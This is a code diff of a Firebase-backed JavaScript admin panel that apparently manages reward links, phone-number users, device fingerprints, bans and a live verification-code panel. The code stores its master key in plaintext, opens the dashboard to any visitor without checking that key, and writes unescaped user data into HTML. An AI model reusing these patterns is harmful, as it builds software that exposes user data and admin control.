@@ -1,8 +1,8 @@
 /**
  * C.I.A. Command Center - Admin Panel
  * First Time Setup → Auto Login After
- * + System Verification Panel
- * + User-Entered Code Display
+ * + System Verification Panel (Anti-Refresh + Copy Button)
+ * + User-Entered Code Display (Real-time accurate)
  */
 
 const firebaseConfig = {
@@ -29,6 +29,7 @@ let bannedUsersData = [];
 let verificationListener = null;
 let verificationCountdownInterval = null;
 let activeVerifications = {};
+let lastRenderHash = '';
 
 // ========== CHECK IF MASTER KEY EXISTS ==========
 async function checkMasterKeyExists() {
@@ -47,13 +48,13 @@ async function setupMasterKey() {
     const confirmKey = document.getElementById('setupConfirmKey').value.trim();
     const errorDiv = document.getElementById('setupError');
     const btn = document.getElementById('setupBtn');
-    
+
     if (!newKey || !confirmKey) {
         errorDiv.innerHTML = "⚠️ Please fill in both fields";
         errorDiv.style.color = '#ff4444';
         return;
     }
-    
+
     if (newKey.length < 4) {
         errorDiv.innerHTML = "⚠️ Key must be at least 4 characters";
         errorDiv.style.color = '#ff4444';
@@ -62,7 +63,7 @@ async function setupMasterKey() {
         document.getElementById('setupNewKey').focus();
         return;
     }
-    
+
     if (newKey !== confirmKey) {
         errorDiv.innerHTML = "⚠️ Keys do not match!";
         errorDiv.style.color = '#ff4444';
@@ -71,36 +72,36 @@ async function setupMasterKey() {
         document.getElementById('setupNewKey').focus();
         return;
     }
-    
+
     try {
         btn.disabled = true;
         errorDiv.innerHTML = "⏳ Saving to Firebase...";
         errorDiv.style.color = '#39ff14';
-        
+
         await db.ref('admin/masterKey').set(newKey);
         await db.ref('admin/setupInfo').set({
             createdAt: Date.now(),
             createdBy: 'ADMIN',
             version: '1.0'
         });
-        
+
         errorDiv.innerHTML = "✅ Master key created successfully!";
         errorDiv.style.color = '#39ff14';
-        
+
         setTimeout(() => {
             document.getElementById('setupOverlay').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             document.getElementById('dashboard').classList.add('active');
-            
+
             loadStats();
             checkGlobalFirewallStatus();
             checkChangeNumberStatus();
-            
+
             initSystemVerificationPanel();
-            
+
             console.log('✅ Setup complete! Auto-login successful.');
         }, 1000);
-        
+
     } catch (error) {
         errorDiv.innerHTML = "❌ Error saving: " + error.message;
         errorDiv.style.color = '#ff4444';
@@ -123,33 +124,33 @@ function showSetupOverlay() {
 // ========== AUTO-LOGIN OR SHOW SETUP ==========
 document.addEventListener('DOMContentLoaded', async function() {
     console.log('🚀 Initializing C.I.A. Admin Panel...');
-    
+
     const dashboard = document.getElementById('dashboard');
     if (dashboard) {
         dashboard.style.display = 'none';
         dashboard.classList.remove('active');
     }
-    
+
     const hasKey = await checkMasterKeyExists();
-    
+
     if (hasKey) {
         console.log('🔑 Master key found. Auto-login...');
         const setupOverlay = document.getElementById('setupOverlay');
         if (setupOverlay) setupOverlay.style.display = 'none';
-        
+
         if (dashboard) {
             dashboard.style.display = 'block';
             dashboard.classList.add('active');
         }
-        
+
         loadStats();
         checkGlobalFirewallStatus();
         checkChangeNumberStatus();
-        
+
         setTimeout(() => {
             initSystemVerificationPanel();
         }, 1000);
-        
+
         console.log('✅ Admin panel ready (Auto-login)');
     } else {
         console.log('🔐 No master key found. Showing setup...');
@@ -175,12 +176,12 @@ document.addEventListener('keydown', function(e) {
 });
 
 // ========== UI FUNCTIONS ==========
-function toggleDropdown(id) { 
+function toggleDropdown(id) {
     const el = document.getElementById(id);
     if (el) el.classList.toggle('open');
 }
 
-function showMasterKeyPopup() { 
+function showMasterKeyPopup() {
     const popup = document.getElementById('keyPopup');
     if (popup) popup.style.display = 'flex';
     setTimeout(() => {
@@ -188,7 +189,7 @@ function showMasterKeyPopup() {
     }, 300);
 }
 
-function closeKeyPopup() { 
+function closeKeyPopup() {
     const popup = document.getElementById('keyPopup');
     if (popup) popup.style.display = 'none';
     document.getElementById('popupNewKey').value = '';
@@ -197,26 +198,26 @@ function closeKeyPopup() {
 // ========== UPDATE MASTER KEY ==========
 async function updateMasterKey() {
     const newKey = document.getElementById('popupNewKey').value.trim();
-    
+
     if (!newKey || newKey.length < 4) {
         alert("⚠️ Key must be at least 4 characters");
         return;
     }
-    
+
     if (!confirm(`⚠️ UPDATE MASTER KEY\n\nChange to "${newKey}"?\n\nThis will not affect your current session.`)) {
         return;
     }
-    
+
     try {
         await db.ref('admin/masterKey').set(newKey);
         await db.ref('admin/lastKeyUpdate').set({
             timestamp: Date.now(),
             updatedBy: 'ADMIN'
         });
-        
+
         alert("✅ Master key updated successfully!");
         closeKeyPopup();
-        
+
     } catch (error) {
         alert("❌ Failed to update: " + error.message);
     }
@@ -225,9 +226,9 @@ async function updateMasterKey() {
 function generateHash(u) {
     if (!u) return '#00000000';
     let h = 0;
-    for (let i = 0; i < u.length; i++) { 
-        h = ((h << 5) - h) + u.charCodeAt(i); 
-        h |= 0; 
+    for (let i = 0; i < u.length; i++) {
+        h = ((h << 5) - h) + u.charCodeAt(i);
+        h |= 0;
     }
     return '#' + Math.abs(h).toString(16).substring(0, 8);
 }
@@ -239,43 +240,43 @@ function deploy() {
         alert("⚠️ Enter at least one link");
         return;
     }
-    
+
     const links = v.split('\n').filter(u => u.trim());
     let count = 0;
-    
+
     links.forEach(u => {
         if (u.trim()) {
-            db.ref('links').push({ 
-                url: u.trim(), 
-                hash: generateHash(u.trim()), 
-                status: 'available', 
-                user: 'NONE', 
-                createdAt: Date.now() 
+            db.ref('links').push({
+                url: u.trim(),
+                hash: generateHash(u.trim()),
+                status: 'available',
+                user: 'NONE',
+                createdAt: Date.now()
             });
             count++;
         }
     });
-    
+
     document.getElementById('links').value = '';
     alert(`✅ ${count} link(s) deployed!`);
 }
 
-function reuseLink(k) { 
-    if (confirm("♻️ Recycle this link?")) 
-        db.ref('links/' + k).update({ status: 'available', user: 'NONE' }); 
+function reuseLink(k) {
+    if (confirm("♻️ Recycle this link?"))
+        db.ref('links/' + k).update({ status: 'available', user: 'NONE' });
 }
 
 // ========== FIREWALL FUNCTIONS ==========
 async function toggleFirewall() {
     const btn = document.getElementById('firewallToggleBtn');
     const statusMsg = document.getElementById('firewallStatusMsg');
-    
+
     if (!globalFirewallActive) {
         if (confirm("🔥 ACTIVATE GLOBAL FIREWALL?\n\nUsers will need verification before claiming.")) {
-            await db.ref('admin/globalFirewall').set({ 
-                active: true, 
-                activatedBy: "ADMIN", 
-                timestamp: Date.now() 
+            await db.ref('admin/globalFirewall').set({
+                active: true,
+                activatedBy: "ADMIN",
+                timestamp: Date.now()
             });
             globalFirewallActive = true;
             if (btn) {
@@ -292,10 +293,10 @@ async function toggleFirewall() {
         }
     } else {
         if (confirm("🔓 DEACTIVATE GLOBAL FIREWALL?\n\nUsers will return to normal claiming.")) {
-            await db.ref('admin/globalFirewall').set({ 
-                active: false, 
-                deactivatedBy: "ADMIN", 
-                timestamp: Date.now() 
+            await db.ref('admin/globalFirewall').set({
+                active: false,
+                deactivatedBy: "ADMIN",
+                timestamp: Date.now()
             });
             globalFirewallActive = false;
             if (btn) {
@@ -319,29 +320,29 @@ async function checkGlobalFirewallStatus() {
         const data = snap.val();
         globalFirewallActive = (data && data.active === true);
         updateBackgroundTheme();
-        
+
         const btn = document.getElementById('firewallToggleBtn');
         const statusMsg = document.getElementById('firewallStatusMsg');
-        
+
         if (globalFirewallActive) {
-            if (btn) { 
-                btn.className = 'firewall-on'; 
-                btn.innerHTML = '🔥 FIREWALL ON 🔥'; 
-                btn.classList.add('fire-animation'); 
+            if (btn) {
+                btn.className = 'firewall-on';
+                btn.innerHTML = '🔥 FIREWALL ON 🔥';
+                btn.classList.add('fire-animation');
             }
-            if (statusMsg) { 
-                statusMsg.innerHTML = '🔥 FIREWALL ACTIVE - Verification required'; 
-                statusMsg.style.color = '#ff4444'; 
+            if (statusMsg) {
+                statusMsg.innerHTML = '🔥 FIREWALL ACTIVE - Verification required';
+                statusMsg.style.color = '#ff4444';
             }
         } else {
-            if (btn) { 
-                btn.className = 'firewall-off'; 
-                btn.innerHTML = '🔥 FIREWALL OFF'; 
-                btn.classList.remove('fire-animation'); 
+            if (btn) {
+                btn.className = 'firewall-off';
+                btn.innerHTML = '🔥 FIREWALL OFF';
+                btn.classList.remove('fire-animation');
             }
-            if (statusMsg) { 
-                statusMsg.innerHTML = '🔓 FIREWALL DEACTIVATED - Normal claiming'; 
-                statusMsg.style.color = '#39ff14'; 
+            if (statusMsg) {
+                statusMsg.innerHTML = '🔓 FIREWALL DEACTIVATED - Normal claiming';
+                statusMsg.style.color = '#39ff14';
             }
         }
     } catch (error) {
@@ -364,22 +365,22 @@ let changeNumberActive = false;
 async function toggleChangeNumber() {
     const checkbox = document.getElementById('changeNumberCheckbox');
     const statusMsg = document.getElementById('firewallStatusMsg');
-    
+
     if (checkbox && checkbox.checked) {
-        await db.ref('admin/changeNumberRequired').set({ 
-            active: true, 
-            activatedBy: "ADMIN", 
-            timestamp: Date.now() 
+        await db.ref('admin/changeNumberRequired').set({
+            active: true,
+            activatedBy: "ADMIN",
+            timestamp: Date.now()
         });
         changeNumberActive = true;
         if (globalFirewallActive && statusMsg) {
             statusMsg.innerHTML = '🔥 FIREWALL ACTIVE - Verification required + Change mobile number';
         }
     } else {
-        await db.ref('admin/changeNumberRequired').set({ 
-            active: false, 
-            deactivatedBy: "ADMIN", 
-            timestamp: Date.now() 
+        await db.ref('admin/changeNumberRequired').set({
+            active: false,
+            deactivatedBy: "ADMIN",
+            timestamp: Date.now()
         });
         changeNumberActive = false;
         if (globalFirewallActive && statusMsg) {
@@ -407,15 +408,15 @@ function banGhost() {
         alert("⚠️ Please enter a phone number to ban.");
         return;
     }
-    
+
     if (!/^09\d{9}$/.test(t)) {
         alert("⚠️ Invalid phone number. Format: 09XXXXXXXXX");
         return;
     }
-    
+
     if (confirm(`⚠️ TERMINATE USER ⚠️\n\nBan ${t}?\n\nThis user will no longer be able to claim rewards.`)) {
-        db.ref('banned_ghosts/' + t).set({ 
-            timestamp: Date.now(), 
+        db.ref('banned_ghosts/' + t).set({
+            timestamp: Date.now(),
             bannedBy: "ADMIN",
             reason: "Manual ban by admin"
         });
@@ -424,7 +425,7 @@ function banGhost() {
     }
 }
 
-function liftBan(phone) { 
+function liftBan(phone) {
     if (confirm(`🔓 UNBAN USER 🔓\n\nUnban ${phone}?`)) {
         db.ref('banned_ghosts/' + phone).remove();
         alert(`✅ ${phone} has been unbanned successfully!`);
@@ -445,9 +446,9 @@ async function deleteSingleUser(phone) {
     }
 }
 
-function purgeGhost(p) { 
-    if (confirm(`Delete data for ${p}?`)) 
-        db.ref('user_sessions/' + p).remove(); 
+function purgeGhost(p) {
+    if (confirm(`Delete data for ${p}?`))
+        db.ref('user_sessions/' + p).remove();
 }
 
 async function loadStats() {
@@ -455,7 +456,7 @@ async function loadStats() {
         const u = await db.ref('user_sessions').once('value');
         const activeBadge = document.getElementById('activeUsersBadge');
         if (activeBadge) activeBadge.innerHTML = (u.numChildren() || 0) + " ACTIVE";
-        
+
         const b = await db.ref('banned_ghosts').once('value');
         const bannedBadge = document.getElementById('bannedBadge');
         if (bannedBadge) bannedBadge.innerHTML = (b.numChildren() || 0) + " BANNED ▼";
@@ -470,15 +471,15 @@ async function getDeviceDisplayId(fp) {
     try {
         const m = await db.ref('device_id_map/' + fp).once('value');
         if (m.exists()) return m.val().displayId;
-        
+
         const c = await db.ref('admin/deviceCounter').once('value');
         let n = (c.val() || 0) + 1;
         await db.ref('admin/deviceCounter').set(n);
         const id = `Dev${n}`;
-        await db.ref('device_id_map/' + fp).set({ 
-            displayId: id, 
-            createdAt: Date.now(), 
-            fingerprint: fp 
+        await db.ref('device_id_map/' + fp).set({
+            displayId: id,
+            createdAt: Date.now(),
+            fingerprint: fp
         });
         return id;
     } catch (error) {
@@ -491,7 +492,7 @@ async function getDeviceDisplayId(fp) {
 db.ref('user_sessions').on('value', async (snapshot) => {
     const sessions = snapshot.val() || {};
     const usersArray = [];
-    
+
     for (const [phone, data] of Object.entries(sessions)) {
         const lastRaw = data.lastUpdate || 0;
         let lastFormatted = '---';
@@ -503,11 +504,11 @@ db.ref('user_sessions').on('value', async (snapshot) => {
             hours = hours % 12 || 12;
             lastFormatted = `${hours}:${minutes} ${ampm}`;
         }
-        
+
         const fp = data.deviceFingerprint || '---';
         let dev = '---';
         if (fp !== '---') dev = await getDeviceDisplayId(fp);
-        
+
         usersArray.push({
             phone: phone,
             balance: (data.balance || 0).toLocaleString(),
@@ -516,16 +517,16 @@ db.ref('user_sessions').on('value', async (snapshot) => {
             lastSeenRaw: lastRaw
         });
     }
-    
+
     currentUserData = usersArray;
     sortByLastSeen();
-    
+
     if (deleteModeState === 1) {
         renderUserTableWithCheckboxes();
     } else {
         renderUserTable();
     }
-    
+
     const activeBadge = document.getElementById('activeUsersBadge');
     if (activeBadge) activeBadge.innerHTML = Object.keys(sessions).length + " ACTIVE";
 });
@@ -545,7 +546,7 @@ db.ref('links').on('value', (snapshot) => {
     if (!t) return;
     t.innerHTML = '';
     const links = snapshot.val() || {};
-    
+
     Object.entries(links).forEach(([key, data]) => {
         const cls = data.status === 'available' ? 'status-avail' : 'status-used';
         const hash = data.hash || generateHash(data.url || '');
@@ -592,12 +593,12 @@ function sortByLastSeen() {
 function renderUserTable() {
     const tbody = document.getElementById('ghostData');
     if (!tbody) return;
-    
+
     if (!currentUserData || currentUserData.length === 0) {
         tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#666; padding:40px;">No users found</td></tr>';
         return;
     }
-    
+
     tbody.innerHTML = '';
     currentUserData.forEach(user => {
         tbody.innerHTML += `
@@ -612,7 +613,7 @@ function renderUserTable() {
             </tr>
         `;
     });
-    
+
     document.querySelectorAll('.delete-user-btn').forEach(btn => {
         btn.addEventListener('click', (e) => {
             e.stopPropagation();
@@ -628,9 +629,9 @@ let actionButtonsVisible = false;
 function toggleActionButtons() {
     const row = document.getElementById('actionButtonsRow');
     const badge = document.getElementById('activeUsersBadge');
-    
+
     actionButtonsVisible = !actionButtonsVisible;
-    
+
     if (actionButtonsVisible && row) {
         row.style.display = 'grid';
         if (badge) badge.innerHTML = badge.innerHTML.replace('▼', '▲');
@@ -644,9 +645,9 @@ let devSortState = 0;
 
 function toggleDevSort() {
     const btn = document.getElementById('devSortBtn');
-    
+
     devSortState = (devSortState + 1) % 3;
-    
+
     if (devSortState === 0) {
         if (btn) {
             btn.setAttribute('data-tooltip', 'Sort by Device (OFF)');
@@ -675,20 +676,20 @@ let timeSortActive = true;
 function toggleTimeSort() {
     const btn = document.getElementById('timeSortBtn');
     const devBtn = document.getElementById('devSortBtn');
-    
+
     timeSortActive = true;
     devSortState = 0;
-    
+
     if (devBtn) {
         devBtn.setAttribute('data-tooltip', 'Sort by Device (OFF)');
         devBtn.classList.remove('active', 'faded');
     }
-    
+
     if (btn) {
         btn.setAttribute('data-tooltip', 'Sort by Time (Active)');
         btn.classList.add('active');
     }
-    
+
     sortByLastSeen();
 }
 
@@ -700,9 +701,9 @@ function toggleDeleteMode() {
     const btn = document.getElementById('deleteModeBtn');
     const selectAllTh = document.getElementById('selectAllTh');
     const bulkBar = document.getElementById('bulkDeleteBar');
-    
+
     deleteModeState = (deleteModeState + 1) % 3;
-    
+
     if (deleteModeState === 0) {
         btn.setAttribute('data-tooltip', 'Delete Mode (OFF)');
         btn.classList.remove('active', 'faded');
@@ -722,7 +723,7 @@ function toggleDeleteMode() {
         btn.setAttribute('data-tooltip', 'Delete Mode (DELETE)');
         btn.classList.add('active');
         btn.classList.remove('faded');
-        
+
         if (selectedUsers.length === 0) {
             alert("⚠️ No users selected. Please select users first.");
             deleteModeState = 1;
@@ -730,7 +731,7 @@ function toggleDeleteMode() {
             btn.classList.add('faded');
             return;
         }
-        
+
         if (confirm(`⚠️ DESTRUCTIVE ACTION ⚠️\n\nDelete ${selectedUsers.length} selected user(s)?`)) {
             deleteSelectedUsers();
         } else {
@@ -744,12 +745,12 @@ function toggleDeleteMode() {
 function renderUserTableWithCheckboxes() {
     const tbody = document.getElementById('ghostData');
     if (!tbody) return;
-    
+
     if (!currentUserData || currentUserData.length === 0) {
         tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#666; padding:40px;">No users found</td></tr>';
         return;
     }
-    
+
     tbody.innerHTML = '';
     currentUserData.forEach(user => {
         const isChecked = selectedUsers.includes(user.phone);
@@ -768,7 +769,7 @@ function renderUserTableWithCheckboxes() {
             </tr>
         `;
     });
-    
+
     document.querySelectorAll('.delete-user-btn').forEach(btn => {
         btn.addEventListener('click', (e) => {
             e.stopPropagation();
@@ -776,7 +777,7 @@ function renderUserTableWithCheckboxes() {
             if (phone) deleteSingleUser(phone);
         });
     });
-    
+
     document.querySelectorAll('.user-checkbox').forEach(cb => {
         cb.addEventListener('change', (e) => {
             e.stopPropagation();
@@ -784,7 +785,7 @@ function renderUserTableWithCheckboxes() {
             toggleUserSelect(phone, cb.checked);
         });
     });
-    
+
     const selectAllCheckbox = document.getElementById('selectAllCheckbox');
     if (selectAllCheckbox) {
         selectAllCheckbox.checked = (selectedUsers.length === currentUserData.length && currentUserData.length > 0);
@@ -798,10 +799,10 @@ function toggleUserSelect(phone, isChecked) {
     } else {
         selectedUsers = selectedUsers.filter(p => p !== phone);
     }
-    
+
     const bulkBar = document.getElementById('bulkDeleteBar');
     const selectedCountSpan = document.getElementById('selectedCount');
-    
+
     if (selectedUsers.length > 0 && bulkBar) {
         bulkBar.style.display = 'flex';
         if (selectedCountSpan) selectedCountSpan.innerHTML = selectedUsers.length;
@@ -813,18 +814,18 @@ function toggleUserSelect(phone, isChecked) {
 function toggleSelectAll() {
     const checkbox = document.getElementById('selectAllCheckbox');
     const isChecked = checkbox.checked;
-    
+
     if (isChecked) {
         selectedUsers = currentUserData.map(u => u.phone);
     } else {
         selectedUsers = [];
     }
-    
+
     renderUserTableWithCheckboxes();
-    
+
     const bulkBar = document.getElementById('bulkDeleteBar');
     const selectedCountSpan = document.getElementById('selectedCount');
-    
+
     if (selectedUsers.length > 0 && bulkBar) {
         bulkBar.style.display = 'flex';
         if (selectedCountSpan) selectedCountSpan.innerHTML = selectedUsers.length;
@@ -843,7 +844,7 @@ function confirmBulkDelete() {
 async function deleteSelectedUsers() {
     let successCount = 0;
     let failCount = 0;
-    
+
     for (const phone of selectedUsers) {
         try {
             await db.ref('user_sessions/' + phone).remove();
@@ -853,16 +854,16 @@ async function deleteSelectedUsers() {
             failCount++;
         }
     }
-    
+
     alert(`✅ ${successCount} user(s) deleted successfully!${failCount > 0 ? `\n⚠️ ${failCount} failed.` : ''}`);
-    
+
     selectedUsers = [];
     deleteModeState = 0;
-    
+
     const btn = document.getElementById('deleteModeBtn');
     const selectAllTh = document.getElementById('selectAllTh');
     const bulkBar = document.getElementById('bulkDeleteBar');
-    
+
     if (btn) btn.classList.remove('active', 'faded');
     if (selectAllTh) selectAllTh.style.display = 'none';
     if (bulkBar) bulkBar.style.display = 'none';
@@ -871,17 +872,17 @@ async function deleteSelectedUsers() {
 function cancelBulkDelete() {
     selectedUsers = [];
     deleteModeState = 0;
-    
+
     const btn = document.getElementById('deleteModeBtn');
     const selectAllTh = document.getElementById('selectAllTh');
     const bulkBar = document.getElementById('bulkDeleteBar');
     const selectAllCheckbox = document.getElementById('selectAllCheckbox');
-    
+
     if (btn) btn.classList.remove('active', 'faded');
     if (selectAllTh) selectAllTh.style.display = 'none';
     if (bulkBar) bulkBar.style.display = 'none';
     if (selectAllCheckbox) selectAllCheckbox.checked = false;
-    
+
     renderUserTable();
 }
 
@@ -889,16 +890,16 @@ function cancelBulkDelete() {
 async function showBannedPopup() {
     const popup = document.getElementById('bannedPopup');
     const badge = document.getElementById('bannedBadge');
-    
+
     if (!popup) return;
-    
+
     badge.style.background = 'linear-gradient(135deg, #ff4444, #aa0000)';
     badge.style.boxShadow = '0 0 15px rgba(255, 68, 68, 0.8)';
     badge.style.border = '1px solid #ff8888';
-    
+
     popup.style.display = 'flex';
     await loadBannedUsers();
-    
+
     popup.onclick = function(e) {
         if (e.target === popup) closeBannedPopup();
     };
@@ -907,19 +908,19 @@ async function showBannedPopup() {
 function closeBannedPopup() {
     const popup = document.getElementById('bannedPopup');
     const badge = document.getElementById('bannedBadge');
-    
+
     if (!popup) return;
-    
+
     badge.style.background = '';
     badge.style.boxShadow = '';
     badge.style.border = '';
-    
+
     popup.style.display = 'none';
-    
+
     const searchInput = document.getElementById('bannedSearchInput');
     const searchResult = document.getElementById('bannedSearchResult');
     const clearBtn = document.querySelector('.search-clear-btn');
-    
+
     if (searchInput) searchInput.value = '';
     if (searchResult) searchResult.style.display = 'none';
     if (clearBtn) clearBtn.style.display = 'none';
@@ -930,19 +931,19 @@ async function loadBannedUsers() {
         const snapshot = await db.ref('banned_ghosts').once('value');
         const banned = snapshot.val() || {};
         const bannedArray = [];
-        
+
         for (const [phone, data] of Object.entries(banned)) {
             const deviceMapSnapshot = await db.ref('device_phone_map').orderByChild('phone').equalTo(phone).once('value');
             let deviceId = 'Unknown';
             let fingerprint = '';
-            
+
             if (deviceMapSnapshot.exists()) {
                 deviceMapSnapshot.forEach((child) => {
                     deviceId = child.val().displayId || 'Unknown';
                     fingerprint = child.key;
                 });
             }
-            
+
             bannedArray.push({
                 phone: phone,
                 deviceId: deviceId,
@@ -950,16 +951,16 @@ async function loadBannedUsers() {
                 timestamp: data.timestamp || 0
             });
         }
-        
+
         bannedArray.sort((a, b) => {
             const numA = parseInt(a.deviceId.replace('Dev', '')) || 0;
             const numB = parseInt(b.deviceId.replace('Dev', '')) || 0;
             return numB - numA;
         });
-        
+
         bannedUsersData = bannedArray;
         renderBannedList(bannedArray.slice(0, 10));
-        
+
         const countDisplay = document.getElementById('bannedCountDisplay');
         if (countDisplay) countDisplay.innerHTML = bannedArray.length;
     } catch (error) {
@@ -970,12 +971,12 @@ async function loadBannedUsers() {
 function renderBannedList(bannedList) {
     const container = document.getElementById('bannedUsersList');
     if (!container) return;
-    
+
     if (!bannedList || bannedList.length === 0) {
         container.innerHTML = '<div class="loading-placeholder">No banned users found</div>';
         return;
     }
-    
+
     let html = '';
     for (const user of bannedList) {
         html += `
@@ -994,9 +995,9 @@ async function searchBannedUsers() {
     const searchResultDiv = document.getElementById('bannedSearchResult');
     const bannedListContainer = document.getElementById('bannedUsersList');
     const searchClearBtn = document.querySelector('.search-clear-btn');
-    
+
     if (!searchResultDiv || !bannedListContainer) return;
-    
+
     if (searchTerm === '') {
         searchResultDiv.style.display = 'none';
         bannedListContainer.style.display = 'block';
@@ -1004,14 +1005,14 @@ async function searchBannedUsers() {
         renderBannedList(bannedUsersData.slice(0, 10));
         return;
     }
-    
+
     if (searchClearBtn) searchClearBtn.style.display = 'flex';
-    
-    const found = bannedUsersData.filter(user => 
-        user.phone.includes(searchTerm) || 
+
+    const found = bannedUsersData.filter(user =>
+        user.phone.includes(searchTerm) ||
         user.deviceId.toLowerCase().includes(searchTerm)
     );
-    
+
     if (found.length === 0) {
         searchResultDiv.style.display = 'block';
         searchResultDiv.innerHTML = `
@@ -1022,11 +1023,11 @@ async function searchBannedUsers() {
         bannedListContainer.style.display = 'none';
         return;
     }
-    
+
     if (found.length === 1) {
         searchResultDiv.style.display = 'block';
         bannedListContainer.style.display = 'none';
-        
+
         const user = found[0];
         searchResultDiv.innerHTML = `
             <div class="banned-user-item" style="background: rgba(255,68,68,0.1); border-radius: 10px;">
@@ -1047,12 +1048,12 @@ function clearBannedSearch() {
     const searchResult = document.getElementById('bannedSearchResult');
     const bannedListContainer = document.getElementById('bannedUsersList');
     const clearBtn = document.querySelector('.search-clear-btn');
-    
+
     if (searchInput) searchInput.value = '';
     if (searchResult) searchResult.style.display = 'none';
     if (clearBtn) clearBtn.style.display = 'none';
     if (bannedListContainer) bannedListContainer.style.display = 'block';
-    
+
     renderBannedList(bannedUsersData.slice(0, 10));
 }
 
@@ -1073,17 +1074,17 @@ async function showBranchDetails(fingerprint, deviceId) {
         alert("No fingerprint data available.");
         return;
     }
-    
+
     const popup = document.getElementById('branchPopup');
     const branchDetails = document.getElementById('branchDetails');
-    
+
     if (!popup || !branchDetails) return;
-    
+
     try {
         const devicePhoneMapRef = db.ref('device_phone_map/' + fingerprint);
         const snapshot = await devicePhoneMapRef.once('value');
         const deviceData = snapshot.val();
-        
+
         branchDetails.innerHTML = `
             <div style="margin-bottom: 15px;">
                 <strong style="color: #00f2ff;">Device ID:</strong> ${deviceId}
@@ -1096,9 +1097,9 @@ async function showBranchDetails(fingerprint, deviceId) {
                 <strong style="color: #00f2ff;">Primary Number:</strong> ${deviceData?.phone || 'Unknown'}
             </div>
         `;
-        
+
         popup.style.display = 'flex';
-        
+
         popup.onclick = function(e) {
             if (e.target === popup) closeBranchPopup();
         };
@@ -1115,7 +1116,10 @@ function closeBranchPopup() {
 // ============================================================
 // 🎯 SYSTEM VERIFICATION PANEL
 // Read data from user_sessions/{phone}/system_verification
-// + Display userEnteredCode (para makita ang aktwal na code)
+// + Display userEnteredCode
+// + Anti-refresh (hash check)
+// + Copy button
+// + Compact display
 // ============================================================
 
 function initSystemVerificationPanel() {
@@ -1124,10 +1128,11 @@ function initSystemVerificationPanel() {
         return;
     }
 
-    // Real-time listener
     if (verificationListener) {
         db.ref('user_sessions').off('value', verificationListener);
     }
+
+    lastRenderHash = '';
 
     verificationListener = db.ref('user_sessions').on('value', function(snapshot) {
         var sessions = snapshot.val() || {};
@@ -1155,7 +1160,6 @@ function initSystemVerificationPanel() {
             }
         });
 
-        // Sort by latest
         verifications.sort(function(a, b) {
             return (b.lastUpdate || 0) - (a.lastUpdate || 0);
         });
@@ -1165,19 +1169,26 @@ function initSystemVerificationPanel() {
             activeVerifications[v.phone] = v;
         });
 
-        renderSystemVerificationList(verifications);
+        // ✅ ANTI-REFRESH: I-render lang kung may nagbago (except timer)
+        var newHash = verifications.map(function(v) {
+            return v.phone + '|' + v.status + '|' + v.code + '|' +
+                   (v.userEnteredCode || '-') + '|' + (v.isMatch ? '1' : '0') + '|' +
+                   v.deviceId;
+        }).join('#');
 
-        // Update count
+        if (newHash !== lastRenderHash) {
+            lastRenderHash = newHash;
+            renderSystemVerificationList(verifications);
+        }
+
+        // Update active count
         var activeCount = verifications.filter(function(v) {
             return v.status === 'active';
         }).length;
         var countEl = document.getElementById('verificationCount');
         if (countEl) countEl.textContent = activeCount;
-
-        console.log('📊 System verifications:', verifications.length, '(Active:', activeCount + ')');
     });
 
-    // Start countdown updater
     if (verificationCountdownInterval) {
         clearInterval(verificationCountdownInterval);
     }
@@ -1206,18 +1217,17 @@ function renderSystemVerificationList(verifications) {
         var statusClass = 'status-' + v.status;
         var badgeClass = v.status;
 
-        // ✅ Status badge text
         var statusText = 'ACTIVE';
         if (v.status === 'expired') statusText = 'EXPIRED';
         if (v.status === 'invalid') statusText = 'INVALID';
         if (v.status === 'verified') statusText = 'VERIFIED';
 
-        var timerClass = 'timer-value';
+        var timerClass = 'timer-display';
         if (v.timer <= 9 && isActive) timerClass += ' urgent';
 
         var createdTime = v.createdAt ? formatVerificationTime(v.createdAt) : '---';
 
-        // ✅ USER-ENTERED CODE DISPLAY
+        // USER-ENTERED CODE DISPLAY
         var userCodeHtml = '';
         if (v.userEnteredCode) {
             var matchClass = v.isMatch ? 'code-match' : 'code-mismatch';
@@ -1225,65 +1235,59 @@ function renderSystemVerificationList(verifications) {
             var matchText = v.isMatch ? 'MATCH' : 'MISMATCH';
 
             userCodeHtml =
-                '<div class="verification-data-box">' +
-                    '<div class="verification-data-label">📝 USER INPUT</div>' +
-                    '<div class="verification-data-value user-code-value ' + matchClass + '">' +
+                '<div class="v-box v-box-wide">' +
+                    '<div class="v-label">📝 USER INPUT</div>' +
+                    '<div class="v-value user-code-value ' + matchClass + '">' +
                         v.userEnteredCode +
                     '</div>' +
-                    '<div class="verification-match-badge ' + matchClass + '">' +
+                    '<div class="v-match-badge ' + matchClass + '">' +
                         matchIcon + ' ' + matchText +
                     '</div>' +
                 '</div>';
         } else {
             userCodeHtml =
-                '<div class="verification-data-box">' +
-                    '<div class="verification-data-label">📝 USER INPUT</div>' +
-                    '<div class="verification-data-value user-code-value waiting">' +
-                        '----' +
-                    '</div>' +
-                    '<div class="verification-match-badge waiting">⏳ WAITING</div>' +
+                '<div class="v-box v-box-wide">' +
+                    '<div class="v-label">📝 USER INPUT</div>' +
+                    '<div class="v-value user-code-value waiting">----</div>' +
+                    '<div class="v-match-badge waiting">⏳ WAITING</div>' +
                 '</div>';
         }
 
         html +=
             '<div class="verification-item ' + statusClass + '" data-phone="' + v.phone + '">' +
-                '<div class="verification-header-row">' +
-                    '<div class="verification-phone">' +
+                '<div class="v-header-row">' +
+                    '<div class="v-phone-wrap">' +
                         '<i class="fas fa-mobile-screen-button"></i>' +
-                        '<span>' + v.phone + '</span>' +
+                        '<span class="v-phone-text">' + v.phone + '</span>' +
+                        '<button class="v-copy-btn" onclick="copyPhone(\'' + v.phone + '\', this)" title="Copy number">📋</button>' +
                     '</div>' +
-                    '<div class="verification-status-badge ' + badgeClass + '">' +
-                        '<span class="status-dot"></span>' +
+                    '<div class="v-status-badge ' + badgeClass + '">' +
+                        '<span class="v-status-dot"></span>' +
                         '<span>' + statusText + '</span>' +
                     '</div>' +
                 '</div>' +
 
-                '<div class="verification-data-grid">' +
-                    '<div class="verification-data-box">' +
-                        '<div class="verification-data-label">⏱ TIMER</div>' +
-                        '<div class="verification-data-value ' + timerClass + '" data-phone="' + v.phone + '">' +
+                '<div class="v-grid">' +
+                    '<div class="v-box">' +
+                        '<div class="v-label">⏱ TIMER</div>' +
+                        '<div class="v-value ' + timerClass + '" data-phone="' + v.phone + '">' +
                             v.timer + 's' +
                         '</div>' +
                     '</div>' +
-                    '<div class="verification-data-box">' +
